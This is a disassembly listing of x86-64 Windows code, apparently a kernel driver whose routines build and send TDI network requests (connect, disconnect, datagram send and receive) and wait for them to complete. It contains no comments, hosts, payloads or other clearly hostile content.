   135d5:	cc                   	int3
   135d6:	cc                   	int3
   135d7:	cc                   	int3
   135d8:	cc                   	int3
   135d9:	cc                   	int3
   135da:	cc                   	int3
   135db:	cc                   	int3
   135dc:	48 8b c4             	mov    %rsp,%rax
   135df:	48 89 58 08          	mov    %rbx,0x8(%rax)
   135e3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   135e7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   135eb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   135ef:	41 54                	push   %r12
   135f1:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   135f8:	41 0f b7 e8          	movzwl %r8w,%ebp
   135fc:	44 8b e2             	mov    %edx,%r12d
   135ff:	48 8b f1             	mov    %rcx,%rsi
   13602:	ff 15 38 1b 00 00    	call   *0x1b38(%rip)        # 0x15140
   13608:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1360d:	45 33 c0             	xor    %r8d,%r8d
   13610:	33 d2                	xor    %edx,%edx
   13612:	48 8b d8             	mov    %rax,%rbx
   13615:	ff 15 fd 1a 00 00    	call   *0x1afd(%rip)        # 0x15118
   1361b:	ba 8c 00 00 00       	mov    $0x8c,%edx
   13620:	33 c9                	xor    %ecx,%ecx
   13622:	ff 15 00 1a 00 00    	call   *0x1a00(%rip)        # 0x15028
   13628:	48 8b f8             	mov    %rax,%rdi
   1362b:	48 85 c0             	test   %rax,%rax
   1362e:	75 0a                	jne    0x1363a
   13630:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13635:	e9 16 01 00 00       	jmp    0x13750
   1363a:	33 d2                	xor    %edx,%edx
   1363c:	41 b8 8c 00 00 00    	mov    $0x8c,%r8d
   13642:	48 8b c8             	mov    %rax,%rcx
   13645:	e8 f6 0b 00 00       	call   0x14240
   1364a:	48 8d 47 30          	lea    0x30(%rdi),%rax
   1364e:	41 bb 16 00 00 00    	mov    $0x16,%r11d
   13654:	48 89 47 28          	mov    %rax,0x28(%rdi)
   13658:	44 89 5f 20          	mov    %r11d,0x20(%rdi)
   1365c:	66 89 68 08          	mov    %bp,0x8(%rax)
   13660:	44 89 60 0a          	mov    %r12d,0xa(%rax)
   13664:	41 8d 53 f8          	lea    -0x8(%r11),%edx
   13668:	45 8d 43 eb          	lea    -0x15(%r11),%r8d
   1366c:	44 89 00             	mov    %r8d,(%rax)
   1366f:	66 89 50 04          	mov    %dx,0x4(%rax)
   13673:	8d 4a f4             	lea    -0xc(%rdx),%ecx
   13676:	66 89 48 06          	mov    %cx,0x6(%rax)
   1367a:	48 8d 6f 46          	lea    0x46(%rdi),%rbp
   1367e:	45 33 c9             	xor    %r9d,%r9d
   13681:	48 8d 45 30          	lea    0x30(%rbp),%rax
   13685:	44 89 5d 20          	mov    %r11d,0x20(%rbp)
   13689:	48 89 45 28          	mov    %rax,0x28(%rbp)
   1368d:	44 89 00             	mov    %r8d,(%rax)
   13690:	66 89 50 04          	mov    %dx,0x4(%rax)
   13694:	66 89 48 06          	mov    %cx,0x6(%rax)
   13698:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1369d:	41 8d 4b ed          	lea    -0x13(%r11),%ecx
   136a1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   136a6:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   136ab:	48 8b d3             	mov    %rbx,%rdx
   136ae:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   136b3:	44 88 44 24 30       	mov    %r8b,0x30(%rsp)
   136b8:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   136bd:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   136c3:	45 33 c0             	xor    %r8d,%r8d
   136c6:	ff 15 6c 1a 00 00    	call   *0x1a6c(%rip)        # 0x15138
   136cc:	48 8b d0             	mov    %rax,%rdx
   136cf:	48 85 c0             	test   %rax,%rax
   136d2:	75 07                	jne    0x136db
   136d4:	bb 9a 00 00 c0       	mov    $0xc000009a,%ebx
   136d9:	eb 68                	jmp    0x13743
   136db:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   136e2:	48 8b cb             	mov    %rbx,%rcx
   136e5:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   136ea:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   136ef:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   136f3:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   136fa:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   136fe:	c6 40 b9 03          	movb   $0x3,-0x47(%rax)
   13702:	48 89 58 e0          	mov    %rbx,-0x20(%rax)
   13706:	48 89 70 e8          	mov    %rsi,-0x18(%rax)
   1370a:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   1370f:	48 89 78 c8          	mov    %rdi,-0x38(%rax)
   13713:	48 89 68 d0          	mov    %rbp,-0x30(%rax)
   13717:	ff 15 43 1a 00 00    	call   *0x1a43(%rip)        # 0x15160
   1371d:	8b d8                	mov    %eax,%ebx
   1371f:	3d 03 01 00 00       	cmp    $0x103,%eax
   13724:	75 1d                	jne    0x13743
   13726:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1372c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   13731:	45 33 c9             	xor    %r9d,%r9d
   13734:	45 33 c0             	xor    %r8d,%r8d
   13737:	33 d2                	xor    %edx,%edx
   13739:	ff 15 11 1a 00 00    	call   *0x1a11(%rip)        # 0x15150
   1373f:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   13743:	33 d2                	xor    %edx,%edx
   13745:	48 8b cf             	mov    %rdi,%rcx
   13748:	ff 15 12 19 00 00    	call   *0x1912(%rip)        # 0x15060
   1374e:	8b c3                	mov    %ebx,%eax
   13750:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   13757:	00 
   13758:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1375c:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   13760:	49 8b 73 20          	mov    0x20(%r11),%rsi
   13764:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   13768:	49 8b e3             	mov    %r11,%rsp
   1376b:	41 5c                	pop    %r12
   1376d:	c3                   	ret
   1376e:	cc                   	int3
   1376f:	cc                   	int3
   13770:	cc                   	int3
   13771:	cc                   	int3
   13772:	cc                   	int3
   13773:	cc                   	int3
   13774:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   13779:	57                   	push   %rdi
   1377a:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   13781:	48 8b f9             	mov    %rcx,%rdi
   13784:	ff 15 b6 19 00 00    	call   *0x19b6(%rip)        # 0x15140
   1378a:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1378f:	45 33 c0             	xor    %r8d,%r8d
   13792:	33 d2                	xor    %edx,%edx
   13794:	48 8b d8             	mov    %rax,%rbx
   13797:	ff 15 7b 19 00 00    	call   *0x197b(%rip)        # 0x15118
   1379d:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   137a2:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   137a7:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   137ac:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   137b1:	45 33 c9             	xor    %r9d,%r9d
   137b4:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   137b9:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   137be:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   137c4:	41 8d 49 03          	lea    0x3(%r9),%ecx
   137c8:	45 33 c0             	xor    %r8d,%r8d
   137cb:	48 8b d3             	mov    %rbx,%rdx
   137ce:	ff 15 64 19 00 00    	call   *0x1964(%rip)        # 0x15138
   137d4:	48 8b d0             	mov    %rax,%rdx
   137d7:	48 85 c0             	test   %rax,%rax
   137da:	75 07                	jne    0x137e3
   137dc:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   137e1:	eb 70                	jmp    0x13853
   137e3:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   137ea:	48 8b cb             	mov    %rbx,%rcx
   137ed:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   137f2:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   137f7:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   137fb:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   13802:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   13806:	c6 40 b9 06          	movb   $0x6,-0x47(%rax)
   1380a:	48 89 58 e0          	mov    %rbx,-0x20(%rax)
   1380e:	48 89 78 e8          	mov    %rdi,-0x18(%rax)
   13812:	48 83 60 c8 00       	andq   $0x0,-0x38(%rax)
   13817:	48 83 60 d0 00       	andq   $0x0,-0x30(%rax)
   1381c:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   13821:	48 c7 40 c0 04 00 00 	movq   $0x4,-0x40(%rax)
   13828:	00 
   13829:	ff 15 31 19 00 00    	call   *0x1931(%rip)        # 0x15160
   1382f:	3d 03 01 00 00       	cmp    $0x103,%eax
   13834:	75 1d                	jne    0x13853
   13836:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1383c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   13841:	45 33 c9             	xor    %r9d,%r9d
   13844:	45 33 c0             	xor    %r8d,%r8d
   13847:	33 d2                	xor    %edx,%edx
   13849:	ff 15 01 19 00 00    	call   *0x1901(%rip)        # 0x15150
   1384f:	8b 44 24 50          	mov    0x50(%rsp),%eax
   13853:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1385a:	00 
   1385b:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   13862:	5f                   	pop    %rdi
   13863:	c3                   	ret
   13864:	cc                   	int3
   13865:	cc                   	int3
   13866:	cc                   	int3
   13867:	cc                   	int3
   13868:	cc                   	int3
   13869:	cc                   	int3
   1386a:	cc                   	int3
   1386b:	cc                   	int3
   1386c:	48 8b c4             	mov    %rsp,%rax
   1386f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   13873:	48 89 78 18          	mov    %rdi,0x18(%rax)
   13877:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1387b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1387f:	41 55                	push   %r13
   13881:	41 56                	push   %r14
   13883:	41 57                	push   %r15
   13885:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1388c:	49 8b f9             	mov    %r9,%rdi
   1388f:	45 0f b7 e0          	movzwl %r8w,%r12d
   13893:	44 8b ea             	mov    %edx,%r13d
   13896:	4c 8b f9             	mov    %rcx,%r15
   13899:	ff 15 a1 18 00 00    	call   *0x18a1(%rip)        # 0x15140
   1389f:	4c 8b f0             	mov    %rax,%r14
   138a2:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   138a7:	45 33 c0             	xor    %r8d,%r8d
   138aa:	33 d2                	xor    %edx,%edx
   138ac:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   138b3:	00 
   138b4:	ff 15 5e 18 00 00    	call   *0x185e(%rip)        # 0x15118
   138ba:	ba 46 00 00 00       	mov    $0x46,%edx
   138bf:	33 c9                	xor    %ecx,%ecx
   138c1:	ff 15 61 17 00 00    	call   *0x1761(%rip)        # 0x15028
   138c7:	48 8b f0             	mov    %rax,%rsi
   138ca:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   138cf:	48 85 c0             	test   %rax,%rax
   138d2:	75 0a                	jne    0x138de
   138d4:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   138d9:	e9 e9 01 00 00       	jmp    0x13ac7
   138de:	33 d2                	xor    %edx,%edx
   138e0:	44 8d 42 46          	lea    0x46(%rdx),%r8d
   138e4:	48 8b c8             	mov    %rax,%rcx
   138e7:	e8 54 09 00 00       	call   0x14240
   138ec:	c7 46 20 16 00 00 00 	movl   $0x16,0x20(%rsi)
   138f3:	48 8d 46 30          	lea    0x30(%rsi),%rax
   138f7:	48 89 46 28          	mov    %rax,0x28(%rsi)
   138fb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   13901:	b9 0e 00 00 00       	mov    $0xe,%ecx
   13906:	66 89 48 04          	mov    %cx,0x4(%rax)
   1390a:	b9 02 00 00 00       	mov    $0x2,%ecx
   1390f:	66 89 48 06          	mov    %cx,0x6(%rax)
   13913:	66 44 89 60 08       	mov    %r12w,0x8(%rax)
   13918:	44 89 68 0a          	mov    %r13d,0xa(%rax)
   1391c:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   13921:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   13926:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   1392d:	00 
   1392e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   13933:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   13938:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1393d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13943:	45 33 c9             	xor    %r9d,%r9d
   13946:	45 33 c0             	xor    %r8d,%r8d
   13949:	49 8b d6             	mov    %r14,%rdx
   1394c:	41 8d 49 03          	lea    0x3(%r9),%ecx
   13950:	ff 15 e2 17 00 00    	call   *0x17e2(%rip)        # 0x15138
   13956:	4c 8b e8             	mov    %rax,%r13
   13959:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1395e:	48 85 c0             	test   %rax,%rax
   13961:	75 15                	jne    0x13978
   13963:	33 d2                	xor    %edx,%edx
   13965:	48 8b ce             	mov    %rsi,%rcx
   13968:	ff 15 f2 16 00 00    	call   *0x16f2(%rip)        # 0x15060
   1396e:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   13973:	e9 4f 01 00 00       	jmp    0x13ac7
   13978:	44 8b a4 24 e0 00 00 	mov    0xe0(%rsp),%r12d
   1397f:	00 
   13980:	45 85 e4             	test   %r12d,%r12d
   13983:	0f 84 ac 00 00 00    	je     0x13a35
   13989:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1398f:	45 33 c9             	xor    %r9d,%r9d
   13992:	45 33 c0             	xor    %r8d,%r8d
   13995:	41 8b d4             	mov    %r12d,%edx
   13998:	48 8b cf             	mov    %rdi,%rcx
   1399b:	ff 15 1f 17 00 00    	call   *0x171f(%rip)        # 0x150c0
   139a1:	48 8b f8             	mov    %rax,%rdi
   139a4:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   139a9:	48 85 c0             	test   %rax,%rax
   139ac:	75 1e                	jne    0x139cc
   139ae:	49 8b cd             	mov    %r13,%rcx
   139b1:	ff 15 a1 17 00 00    	call   *0x17a1(%rip)        # 0x15158
   139b7:	33 d2                	xor    %edx,%edx
   139b9:	48 8b ce             	mov    %rsi,%rcx
   139bc:	ff 15 9e 16 00 00    	call   *0x169e(%rip)        # 0x15060
   139c2:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   139c7:	e9 fb 00 00 00       	jmp    0x13ac7
   139cc:	45 33 c0             	xor    %r8d,%r8d
   139cf:	33 d2                	xor    %edx,%edx
   139d1:	48 8b c8             	mov    %rax,%rcx
   139d4:	ff 15 ce 16 00 00    	call   *0x16ce(%rip)        # 0x150a8
   139da:	33 c0                	xor    %eax,%eax
   139dc:	89 44 24 50          	mov    %eax,0x50(%rsp)
   139e0:	eb 4a                	jmp    0x13a2c
   139e2:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   139e7:	48 8b cf             	mov    %rdi,%rcx
   139ea:	ff 15 88 16 00 00    	call   *0x1688(%rip)        # 0x15078
   139f0:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   139f5:	49 8b cd             	mov    %r13,%rcx
   139f8:	ff 15 5a 17 00 00    	call   *0x175a(%rip)        # 0x15158
   139fe:	33 d2                	xor    %edx,%edx
   13a00:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   13a05:	48 8b ce             	mov    %rsi,%rcx
   13a08:	ff 15 52 16 00 00    	call   *0x1652(%rip)        # 0x15060
   13a0e:	b8 e8 00 00 c0       	mov    $0xc00000e8,%eax
   13a13:	89 44 24 50          	mov    %eax,0x50(%rsp)
   13a17:	44 8b a4 24 e0 00 00 	mov    0xe0(%rsp),%r12d
   13a1e:	00 
   13a1f:	4c 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%r15
   13a26:	00 
   13a27:	4c 8b 74 24 70       	mov    0x70(%rsp),%r14
   13a2c:	85 c0                	test   %eax,%eax
   13a2e:	79 0a                	jns    0x13a3a
   13a30:	e9 92 00 00 00       	jmp    0x13ac7
   13a35:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   13a3a:	49 8b 85 b8 00 00 00 	mov    0xb8(%r13),%rax
   13a41:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   13a46:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   13a4b:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   13a4f:	49 8b 85 b8 00 00 00 	mov    0xb8(%r13),%rax
   13a56:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   13a5a:	c6 40 b9 09          	movb   $0x9,-0x47(%rax)
   13a5e:	4c 89 70 e0          	mov    %r14,-0x20(%rax)
   13a62:	4c 89 78 e8          	mov    %r15,-0x18(%rax)
   13a66:	44 89 60 c0          	mov    %r12d,-0x40(%rax)
   13a6a:	48 89 70 c8          	mov    %rsi,-0x38(%rax)
   13a6e:	41 f7 dc             	neg    %r12d
   13a71:	48 1b c0             	sbb    %rax,%rax
   13a74:	48 23 c7             	and    %rdi,%rax
   13a77:	49 89 45 08          	mov    %rax,0x8(%r13)
   13a7b:	49 8b d5             	mov    %r13,%rdx
   13a7e:	49 8b ce             	mov    %r14,%rcx
   13a81:	ff 15 d9 16 00 00    	call   *0x16d9(%rip)        # 0x15160
   13a87:	8b f8                	mov    %eax,%edi
   13a89:	3d 03 01 00 00       	cmp    $0x103,%eax
   13a8e:	75 20                	jne    0x13ab0
   13a90:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13a96:	45 33 c9             	xor    %r9d,%r9d
   13a99:	45 33 c0             	xor    %r8d,%r8d
   13a9c:	33 d2                	xor    %edx,%edx
   13a9e:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   13aa5:	00 
   13aa6:	ff 15 a4 16 00 00    	call   *0x16a4(%rip)        # 0x15150
   13aac:	8b 7c 24 78          	mov    0x78(%rsp),%edi
   13ab0:	33 d2                	xor    %edx,%edx
   13ab2:	48 8b ce             	mov    %rsi,%rcx
   13ab5:	ff 15 a5 15 00 00    	call   *0x15a5(%rip)        # 0x15060
   13abb:	85 ff                	test   %edi,%edi
   13abd:	0f 49 bc 24 80 00 00 	cmovns 0x80(%rsp),%edi
   13ac4:	00 
   13ac5:	8b c7                	mov    %edi,%eax
   13ac7:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   13ace:	00 
   13acf:	49 8b 73 28          	mov    0x28(%r11),%rsi
   13ad3:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   13ad7:	4d 8b 63 38          	mov    0x38(%r11),%r12
   13adb:	49 8b e3             	mov    %r11,%rsp
   13ade:	41 5f                	pop    %r15
   13ae0:	41 5e                	pop    %r14
   13ae2:	41 5d                	pop    %r13
   13ae4:	c3                   	ret
   13ae5:	cc                   	int3
   13ae6:	cc                   	int3
   13ae7:	cc                   	int3
   13ae8:	cc                   	int3
   13ae9:	cc                   	int3
   13aea:	cc                   	int3
   13aeb:	cc                   	int3
   13aec:	4c 8b dc             	mov    %rsp,%r11
   13aef:	49 89 73 20          	mov    %rsi,0x20(%r11)
   13af3:	4d 89 43 18          	mov    %r8,0x18(%r11)
   13af7:	49 89 53 10          	mov    %rdx,0x10(%r11)
   13afb:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   13aff:	57                   	push   %rdi
   13b00:	41 54                	push   %r12
   13b02:	41 55                	push   %r13
   13b04:	41 56                	push   %r14
   13b06:	41 57                	push   %r15
   13b08:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   13b0f:	49 8b f9             	mov    %r9,%rdi
   13b12:	4d 8b f0             	mov    %r8,%r14
   13b15:	4c 8b fa             	mov    %rdx,%r15
   13b18:	48 8b c1             	mov    %rcx,%rax
   13b1b:	83 64 24 70 00       	andl   $0x0,0x70(%rsp)
   13b20:	33 c9                	xor    %ecx,%ecx
   13b22:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   13b26:	49 89 4b 90          	mov    %rcx,-0x70(%r11)
   13b2a:	48 8b c8             	mov    %rax,%rcx
   13b2d:	ff 15 0d 16 00 00    	call   *0x160d(%rip)        # 0x15140
   13b33:	4c 8b e0             	mov    %rax,%r12
   13b36:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   13b3d:	00 
   13b3e:	45 33 c0             	xor    %r8d,%r8d
   13b41:	33 d2                	xor    %edx,%edx
   13b43:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
   13b4a:	00 
   13b4b:	ff 15 c7 15 00 00    	call   *0x15c7(%rip)        # 0x15118
   13b51:	41 bd 76 00 00 00    	mov    $0x76,%r13d
   13b57:	49 8b d5             	mov    %r13,%rdx
   13b5a:	33 c9                	xor    %ecx,%ecx
   13b5c:	ff 15 c6 14 00 00    	call   *0x14c6(%rip)        # 0x15028
   13b62:	48 8b f0             	mov    %rax,%rsi
   13b65:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   13b6c:	00 
   13b6d:	48 85 c0             	test   %rax,%rax
   13b70:	0f 84 64 02 00 00    	je     0x13dda
   13b76:	4d 8b c5             	mov    %r13,%r8
   13b79:	33 d2                	xor    %edx,%edx
   13b7b:	48 8b c8             	mov    %rax,%rcx
   13b7e:	e8 bd 06 00 00       	call   0x14240
   13b83:	83 66 20 00          	andl   $0x0,0x20(%rsi)
   13b87:	48 83 66 28 00       	andq   $0x0,0x28(%rsi)
   13b8c:	48 8d 4e 30          	lea    0x30(%rsi),%rcx
   13b90:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   13b95:	c7 41 20 16 00 00 00 	movl   $0x16,0x20(%rcx)
   13b9c:	48 8d 41 30          	lea    0x30(%rcx),%rax
   13ba0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   13ba5:	48 89 41 28          	mov    %rax,0x28(%rcx)
   13ba9:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   13bb0:	00 
   13bb1:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   13bb7:	b9 0e 00 00 00       	mov    $0xe,%ecx
   13bbc:	66 89 48 04          	mov    %cx,0x4(%rax)
   13bc0:	b9 02 00 00 00       	mov    $0x2,%ecx
   13bc5:	66 89 48 06          	mov    %cx,0x6(%rax)
   13bc9:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   13bce:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   13bd3:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   13bda:	00 
   13bdb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   13be0:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   13be5:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   13bea:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13bf0:	45 33 c9             	xor    %r9d,%r9d
   13bf3:	45 33 c0             	xor    %r8d,%r8d
   13bf6:	49 8b d4             	mov    %r12,%rdx
   13bf9:	41 8d 49 03          	lea    0x3(%r9),%ecx
   13bfd:	ff 15 35 15 00 00    	call   *0x1535(%rip)        # 0x15138
   13c03:	4c 8b e8             	mov    %rax,%r13
   13c06:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   13c0d:	00 
   13c0e:	48 85 c0             	test   %rax,%rax
   13c11:	75 12                	jne    0x13c25
   13c13:	33 d2                	xor    %edx,%edx
   13c15:	48 8b ce             	mov    %rsi,%rcx
   13c18:	ff 15 42 14 00 00    	call   *0x1442(%rip)        # 0x15060
   13c1e:	33 c0                	xor    %eax,%eax
   13c20:	e9 b5 01 00 00       	jmp    0x13dda
   13c25:	44 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12d
   13c2c:	00 
   13c2d:	45 85 e4             	test   %r12d,%r12d
   13c30:	0f 84 c7 00 00 00    	je     0x13cfd
   13c36:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   13c3c:	45 33 c9             	xor    %r9d,%r9d
   13c3f:	45 33 c0             	xor    %r8d,%r8d
   13c42:	41 8b d4             	mov    %r12d,%edx
   13c45:	48 8b cf             	mov    %rdi,%rcx
   13c48:	ff 15 72 14 00 00    	call   *0x1472(%rip)        # 0x150c0
   13c4e:	48 8b f8             	mov    %rax,%rdi
   13c51:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   13c56:	48 85 c0             	test   %rax,%rax
   13c59:	75 1b                	jne    0x13c76
   13c5b:	49 8b cd             	mov    %r13,%rcx
   13c5e:	ff 15 f4 14 00 00    	call   *0x14f4(%rip)        # 0x15158
   13c64:	33 d2                	xor    %edx,%edx
   13c66:	48 8b ce             	mov    %rsi,%rcx
   13c69:	ff 15 f1 13 00 00    	call   *0x13f1(%rip)        # 0x15060
   13c6f:	33 c0                	xor    %eax,%eax
   13c71:	e9 64 01 00 00       	jmp    0x13dda
   13c76:	33 d2                	xor    %edx,%edx
   13c78:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   13c7c:	48 8b c8             	mov    %rax,%rcx
   13c7f:	ff 15 23 14 00 00    	call   *0x1423(%rip)        # 0x150a8
   13c85:	45 33 db             	xor    %r11d,%r11d
   13c88:	44 89 5c 24 60       	mov    %r11d,0x60(%rsp)
   13c8d:	eb 62                	jmp    0x13cf1
   13c8f:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   13c94:	48 8b cf             	mov    %rdi,%rcx
   13c97:	ff 15 db 13 00 00    	call   *0x13db(%rip)        # 0x15078
   13c9d:	4c 8b ac 24 88 00 00 	mov    0x88(%rsp),%r13
   13ca4:	00 
   13ca5:	49 8b cd             	mov    %r13,%rcx
   13ca8:	ff 15 aa 14 00 00    	call   *0x14aa(%rip)        # 0x15158
   13cae:	33 d2                	xor    %edx,%edx
   13cb0:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   13cb7:	00 
   13cb8:	48 8b ce             	mov    %rsi,%rcx
   13cbb:	ff 15 9f 13 00 00    	call   *0x139f(%rip)        # 0x15060
   13cc1:	41 bb e8 00 00 c0    	mov    $0xc00000e8,%r11d
   13cc7:	44 89 5c 24 60       	mov    %r11d,0x60(%rsp)
   13ccc:	44 8b a4 24 10 01 00 	mov    0x110(%rsp),%r12d
   13cd3:	00 
   13cd4:	4c 8b b4 24 00 01 00 	mov    0x100(%rsp),%r14
   13cdb:	00 
   13cdc:	4c 8b bc 24 f8 00 00 	mov    0xf8(%rsp),%r15
   13ce3:	00 
   13ce4:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   13ceb:	00 
   13cec:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   13cf1:	45 85 db             	test   %r11d,%r11d
   13cf4:	79 0c                	jns    0x13d02
   13cf6:	33 c0                	xor    %eax,%eax
   13cf8:	e9 dd 00 00 00       	jmp    0x13dda
   13cfd:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   13d02:	49 8b 85 b8 00 00 00 	mov    0xb8(%r13),%rax
   13d09:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   13d0e:	48 83 60 f8 00       	andq   $0x0,-0x8(%rax)
   13d13:	c6 40 bb 00          	movb   $0x0,-0x45(%rax)
   13d17:	49 8b 85 b8 00 00 00 	mov    0xb8(%r13),%rax
   13d1e:	c6 40 b8 0f          	movb   $0xf,-0x48(%rax)
   13d22:	c6 40 b9 0a          	movb   $0xa,-0x47(%rax)
   13d26:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   13d2d:	00 
   13d2e:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   13d32:	48 8b 94 24 f0 00 00 	mov    0xf0(%rsp),%rdx
   13d39:	00 
   13d3a:	48 89 50 e8          	mov    %rdx,-0x18(%rax)
   13d3e:	44 89 60 c0          	mov    %r12d,-0x40(%rax)
   13d42:	48 89 70 c8          	mov    %rsi,-0x38(%rax)
   13d46:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   13d4b:	48 89 50 d0          	mov    %rdx,-0x30(%rax)
   13d4f:	c7 40 d8 20 00 00 00 	movl   $0x20,-0x28(%rax)
   13d56:	41 f7 dc             	neg    %r12d
   13d59:	48 1b c0             	sbb    %rax,%rax
   13d5c:	48 23 c7             	and    %rdi,%rax
   13d5f:	49 89 45 08          	mov    %rax,0x8(%r13)
   13d63:	49 8b d5             	mov    %r13,%rdx
   13d66:	ff 15 f4 13 00 00    	call   *0x13f4(%rip)        # 0x15160
   13d6c:	8b f8                	mov    %eax,%edi
   13d6e:	3d 03 01 00 00       	cmp    $0x103,%eax
   13d73:	75 2d                	jne    0x13da2
   13d75:	48 c7 44 24 58 80 2e 	movq   $0xfffffffff70f2e80,0x58(%rsp)
   13d7c:	0f f7 
   13d7e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   13d83:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   13d88:	45 33 c9             	xor    %r9d,%r9d
   13d8b:	45 33 c0             	xor    %r8d,%r8d
